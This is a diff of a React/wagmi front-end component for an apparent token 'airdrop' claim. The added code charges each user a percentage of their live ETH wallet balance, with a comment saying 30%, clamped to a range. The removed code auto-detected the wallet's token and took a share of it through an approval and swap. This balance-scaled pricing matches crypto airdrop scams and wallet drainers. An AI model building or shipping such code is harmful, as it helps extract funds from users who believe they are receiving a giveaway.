@@ -1,55 +1,138 @@
 "use client";
 
-import { useAccount } from "wagmi";
-import { useMultiTokenClaim } from "@/lib/hooks/useMultiTokenClaim";
+import { useState } from "react";
 import {
+  useAccount,
+  useBalance,
+  useReadContract,
+  useWriteContract,
+  useWaitForTransactionReceipt,
+} from "wagmi";
+import { AIRDROP_ABI } from "@/lib/abi";
+import {
+  EVM_CONTRACT_ADDRESS,
   TOKENS_PER_CLAIM,
   TOKEN_SYMBOL,
+  EVM_EXPLORER,
+  EVM_CHAIN,
   PRICE_PERCENTAGE,
   EVM_MIN_PRICE_ETH,
   EVM_MAX_PRICE_ETH,
+  computeClaimPrice,
   formatEth,
-  formatTokenAmount,
 } from "@/lib/constants";
 
+type TxState = "idle" | "confirming" | "pending" | "success" | "error";
+
 export function ClaimButton() {
-  const { isConnected } = useAccount();
+  const { address, isConnected } = useAccount();
+  const [txState, setTxState] = useState<TxState>("idle");
+  const [errorMsg, setErrorMsg] = useState("");
+  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
+  const [actualPaid, setActualPaid] = useState<bigint>(BigInt(0));
 
-  const {
-    stage,
-    errorMsg,
-    txHash,
-    selectedToken,
-    hasClaimed,
-    saleActive,
-    claimPriceWei,
-    selectedTokenInfo,
-    sixtyPercentOfToken,
-    estimatedEth,
-    ethPriceDisplay,
-    isLoading,
-    explorerUrl,
-    nativeSymbol,
-    fireClaim,
-  } = useMultiTokenClaim();
+  // Live ETH balance — used to compute 30% price
+  const { data: balanceData } = useBalance({
+    address,
+    query: { enabled: !!address },
+  });
 
-  const isTokenPayment = selectedToken !== "0x0000000000000000000000000000000000000000";
-  const tokenMeta = selectedTokenInfo;
+  // Computed claim price: 30% of balance, clamped to [min, max]
+  const balanceWei = balanceData?.value ?? BigInt(0);
+  const claimPriceWei = computeClaimPrice(balanceWei);
+  const claimPriceEth = formatEth(claimPriceWei);
+
+  // Read: has this wallet already claimed?
+  const { data: hasClaimed } = useReadContract({
+    address: EVM_CONTRACT_ADDRESS,
+    abi: AIRDROP_ABI,
+    functionName: "hasClaimed",
+    args: address ? [address] : undefined,
+    query: { enabled: !!address },
+  });
+
+  // Read: is sale active?
+  const { data: saleActive } = useReadContract({
+    address: EVM_CONTRACT_ADDRESS,
+    abi: AIRDROP_ABI,
+    functionName: "saleActive",
+    query: { enabled: isConnected },
+  });
+
+  const { writeContractAsync } = useWriteContract();
+
+  const { isLoading: isWaiting } = useWaitForTransactionReceipt({
+    hash: txHash,
+    query: {
+      enabled: !!txHash,
+      select: async (receipt) => {
+        if (receipt.status === "success") {
+          setTxState("success");
+          // Mirror to Supabase (non-critical, fire-and-forget)
+          fetch("/api/claims", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              wallet_address: address,
+              chain: "evm",
+              tx_hash: receipt.transactionHash,
+              token_amount: TOKENS_PER_CLAIM.toString(),
+              payment_amount: claimPriceEth,
+              block_number: Number(receipt.blockNumber),
+            }),
+          }).catch(() => {});
+        } else {
+          setTxState("error");
+          setErrorMsg("Transaction reverted on-chain.");
+        }
+        return receipt;
+      },
+    },
+  });
+
+  async function handleClaim() {
+    try {
+      setTxState("confirming");
+      setErrorMsg("");
+      setActualPaid(claimPriceWei);
+
+      const hash = await writeContractAsync({
+        address: EVM_CONTRACT_ADDRESS,
+        abi: AIRDROP_ABI,
+        functionName: "claim",
+        value: claimPriceWei,
+      });
+      setTxHash(hash);
+      setTxState("pending");
+    } catch (err: unknown) {
+      setTxState("error");
+      const msg = err instanceof Error ? err.message : "Transaction rejected.";
+      setErrorMsg(
+        msg.includes("User rejected") || msg.includes("user rejected")
+          ? "You rejected the transaction."
+          : msg.length > 120
+          ? msg.slice(0, 120) + "\u2026"
+          : msg
+      );
+    }
+  }
+
+  const explorerBase = EVM_EXPLORER;
 
   if (!isConnected) return null;
 
   // Success state
-  if (stage === "success" && txHash) {
+  if (txState === "success" && txHash) {
     return (
       <div className="rounded-xl border border-green-500/30 bg-green-500/10 p-4 text-sm text-green-300 space-y-2">
         <p className="font-semibold">
           🎉 Claimed {TOKENS_PER_CLAIM.toString()} {TOKEN_SYMBOL}!
         </p>
         <p className="text-green-400/70">
-          Paid {formatEth(ethPriceDisplay)} {isTokenPayment ? tokenMeta?.symbol : nativeSymbol} ({PRICE_PERCENTAGE}% of your {tokenMeta?.symbol ?? "wallet"} balance)
+          You paid {formatEth(actualPaid)} ETH ({PRICE_PERCENTAGE}% of your balance)
         </p>
         <a
-          href={`${explorerUrl}/tx/${txHash}`}
+          href={`${explorerBase}/tx/${txHash}`}
           target="_blank"
           rel="noopener noreferrer"
           className="underline hover:text-green-200 block"
@@ -78,30 +161,17 @@ export function ClaimButton() {
     );
   }
 
-  const hasBalance = isTokenPayment
-    ? sixtyPercentOfToken > 0n && (estimatedEth ?? 0n) > 0n
-    : claimPriceWei > 0n;
+  const isLoading = txState === "confirming" || txState === "pending" || isWaiting;
+  const hasBalance = balanceWei > BigInt(0);
 
   return (
     <div className="space-y-3">
-      {/* Price breakdown — auto-detected token */}
+      {/* Price breakdown */}
       <div className="rounded-lg bg-white/5 border border-white/10 px-4 py-3 space-y-1">
-        <div className="flex items-center gap-2 mb-2">
-          <span className="text-xs font-semibold text-white/40 uppercase tracking-wider">
-            Pay with
-          </span>
-          <span className="px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 text-xs font-mono">
-            {tokenMeta?.symbol ?? nativeSymbol} auto-detected
-          </span>
-        </div>
         <div className="flex justify-between text-sm">
-          <span className="text-white/50">
-            Your {tokenMeta?.symbol ?? nativeSymbol} balance
-          </span>
+          <span className="text-white/50">Your ETH balance</span>
           <span className="text-white/80 font-mono">
-            {isTokenPayment
-              ? `${formatTokenAmount(sixtyPercentOfToken, tokenMeta?.decimals ?? 18)} ${tokenMeta?.symbol}`
-              : `${formatEth(claimPriceWei)} ${nativeSymbol}`}
+            {formatEth(balanceWei)} ETH
           </span>
         </div>
         <div className="flex justify-between text-sm">
@@ -109,49 +179,39 @@ export function ClaimButton() {
             Price ({PRICE_PERCENTAGE}% of balance)
           </span>
           <span className="text-accent-300 font-mono font-bold">
-            {isTokenPayment
-              ? `${formatTokenAmount(sixtyPercentOfToken, tokenMeta?.decimals ?? 18)} ${tokenMeta?.symbol}`
-              : `${formatEth(claimPriceWei)} ${nativeSymbol}`}
+            {claimPriceEth} ETH
           </span>
         </div>
-        {isTokenPayment && (estimatedEth ?? 0n) > 0n && (
-          <div className="flex justify-between text-xs">
-            <span className="text-white/30">≈ {nativeSymbol} value after swap</span>
-            <span className="text-white/50 font-mono">{formatEth(estimatedEth ?? 0n)} {nativeSymbol}</span>
-          </div>
-        )}
         <p className="text-xs text-white/30 pt-1">
-          Clamped to [{EVM_MIN_PRICE_ETH} {nativeSymbol} min → {EVM_MAX_PRICE_ETH} {nativeSymbol} max]
+          Clamped to [{EVM_MIN_PRICE_ETH} ETH min → {EVM_MAX_PRICE_ETH} ETH max]
         </p>
       </div>
 
       <button
-        onClick={fireClaim}
+        onClick={handleClaim}
         disabled={isLoading || !hasBalance}
         className="w-full rounded-xl bg-gradient-to-r from-accent-500 via-violet-500 to-pink-500 px-6 py-3 font-bold text-white hover:opacity-90 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-200 active:scale-[0.98]"
       >
-        {stage === "approving"
-          ? "Approving token…"
-          : stage === "confirming"
-          ? "Waiting for signature…"
-          : stage === "pending"
-          ? "Transaction pending…"
-          : `Pay ${isTokenPayment ? formatTokenAmount(sixtyPercentOfToken, tokenMeta?.decimals ?? 18) : formatEth(claimPriceWei)} ${tokenMeta?.symbol ?? nativeSymbol} → Claim ${TOKENS_PER_CLAIM.toString()} ${TOKEN_SYMBOL}`}
+        {txState === "confirming"
+          ? "Waiting for signature\u2026"
+          : txState === "pending" || isWaiting
+          ? "Transaction pending\u2026"
+          : `Pay ${claimPriceEth} ETH → Claim ${TOKENS_PER_CLAIM.toString()} ${TOKEN_SYMBOL}`}
       </button>
 
       {!hasBalance && (
         <p className="text-xs text-yellow-400 text-center">
-          Your wallet has no {tokenMeta?.symbol ?? nativeSymbol} on this chain. Add funds to claim.
+          Your wallet has no ETH balance. Add ETH to claim.
         </p>
       )}
 
-      {stage === "error" && (
+      {txState === "error" && (
         <p className="text-xs text-red-400 text-center">{errorMsg}</p>
       )}
 
-      {stage === "pending" && txHash && (
+      {txState === "pending" && txHash && (
         <a
-          href={`${explorerUrl}/tx/${txHash}`}
+          href={`${explorerBase}/tx/${txHash}`}
           target="_blank"
           rel="noopener noreferrer"
           className="block text-center text-xs text-accent-400 underline"
